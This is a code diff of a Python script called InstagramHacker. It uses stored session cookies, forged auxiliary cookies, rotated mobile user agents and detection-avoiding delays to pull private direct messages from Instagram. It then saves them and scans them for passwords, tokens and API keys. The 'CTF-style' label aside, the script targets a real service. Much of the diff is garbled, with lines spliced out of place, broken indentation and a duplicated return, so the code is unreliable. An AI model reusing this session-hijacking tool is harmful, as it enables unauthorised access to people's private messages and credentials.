@@ -15,15 +15,13 @@ import re
 import time
 import random
 import hashlib
-from pathlib import Path
 from datetime import datetime
 import os
-import subprocess
 
 # 🎭 Configuration
 SESSION_PATHS = [
     "sensitive_data/session.json",
-    "session.json", 
+    "session.json",
     "fresh_sessions/working_session_1749202526.json",
     "fresh_sessions/working_session_1749202527.json",
     "alx_trading_session_fleming654.json"
@@ -31,9 +29,12 @@ SESSION_PATHS = [
 
 # 🔥 User Agent Pool (Real mobile signatures)
 MOBILE_AGENTS = [
-    "Instagram 246.0.0.20.107 Android (29/10; 420dpi; 1080x2220; samsung; SM-G975F)",
-    "Instagram 195.0.0.45.120 iPhone13,2 iOS (15.0; en_US; en-US; scale=3.00)",
-    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) Mobile/19A346 Instagram",
+    "Instagram 246.0.0.20.107 Android (29/10; 420dpi; 1080x2220; "
+    "samsung; SM-G975F)",
+    "Instagram 195.0.0.45.120 iPhone13,2 iOS (15.0; en_US; en-US; "
+    "scale=3.00)",
+    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) "
+    "Mobile/19A346 Instagram",
     "Mozilla/5.0 (Android 11; Mobile; rv:91.0) Instagram/195.0.0.45.120"
 ]
 
@@ -111,22 +112,44 @@ class InstagramHacker:
         if not self.sessionid:
             return False
         
-        # Main session cookie
-        self.session.cookies.set("sessionid", self.sessionid, domain=".instagram.com")
-        
+        self.session.cookies.set(
+            "sessionid", self.sessionid, domain=".instagram.com"
+        )
+
         # Additional required cookies
-        self.session.cookies.set("ds_user_id", str(random.randint(1000000000, 9999999999)), domain=".instagram.com")
-        self.session.cookies.set("mid", f"Y{random.choice('ABCDEFGHIJKLMNOPQRSTUVWXYZ')}{random.randint(100000, 999999)}", domain=".instagram.com")
-        self.session.cookies.set("ig_did", f"{random.randint(10000000, 99999999)}-{random.randint(1000, 9999)}", domain=".instagram.com")
-        self.session.cookies.set("csrftoken", hashlib.md5(str(random.random()).encode()).hexdigest(), domain=".instagram.com")
-        
+        self.session.cookies.set(
+            "ds_user_id",
+            str(random.randint(1000000000, 9999999999)),
+            domain=".instagram.com"
+        )
+        self.session.cookies.set(
+            "mid",
+            f"Y{random.choice('ABCDEFGHIJKLMNOPQRSTUVWXYZ')}"
+            f"{random.randint(100000, 999999)}",
+            domain=".instagram.com"
+        )
+        self.session.cookies.set(
+            "ig_did",
+            f"{random.randint(10000000, 99999999)}-{random.randint(1000, 9999)}",
+            domain=".instagram.com"
+        )
+        self.session.cookies.set(
+            "csrftoken",
+            hashlib.md5(str(random.random()).encode()).hexdigest(),
+            domain=".instagram.com"
+        )
+
+        return True
         return True
     
     def hack_dm_data(self):
         """Main DM extraction function"""
         print("🎯 Starting DM extraction hack...")
         
-        for i, endpoint in enumerate(HACK_ENDPOINTS):
+                    print(
+                        f"⚠️ Status {response.status_code}: "
+                        f"{response.text[:100]}"
+                    )
             print(f"\\n🔄 Attempt {i+1}: {endpoint}")
             
             # Random delay to avoid detection
@@ -143,24 +166,29 @@ class InstagramHacker:
                     print("🔒 Unauthorized - session may be expired")
                 elif response.status_code == 403:
                     print("🚫 Forbidden - rate limited or blocked")
-                elif response.status_code == 400:
+        keys = list(data.keys()) if isinstance(data, dict) else 'Not a dict'
+        print(f"📊 JSON keys: {keys}")
                     print("❌ Bad Request - trying next endpoint...")
                 else:
                     print(f"⚠️ Status {response.status_code}: {response.text[:100]}")
                     
             except Exception as e:
                 print(f"❌ Request failed: {e}")
-                continue
-        
-        return None
-    
-    def analyze_extracted_data(self, data):
-        """CTF-style data analysis"""
-        print("\\n🔍 FORENSIC ANALYSIS")
-        print("=" * 50)
-        
-        if not data:
-            print("❌ No data to analyze")
+                    decoded = base64.b64decode(pattern).decode(
+                        'utf-8', errors='ignore'
+                    )
+                    if decoded.isprintable() and len(decoded) > 5:
+                        print(
+                            f"  [{i+1}] {pattern[:30]}... -> {decoded[:50]}"
+                        )
+                except Exception:
+                    pass
+            r'CTF\{[^}]+\}',
+            r'secret[_-]?key',
+            r'password',
+            r'token',
+            r'api[_-]?key'
+        ]
             return
         
         # Basic statistics
@@ -212,10 +240,16 @@ class InstagramHacker:
             
             print(f"  💬 Total messages: {total_messages}")
             print(f"  👥 Unique users: {len(users)}")
-            print(f"  📊 Users: {', '.join(list(users)[:10])}")
+                "size_bytes": (
+                    os.path.getsize(filename)
+                    if filename and os.path.exists(filename)
+                    else 0
+                )
     
     def save_hacked_data(self, data):
-        """Save extracted data with timestamp"""
+            total_messages = sum(
+                len(thread.get('items', [])) for thread in threads
+            )
         if not data:
             return None
         
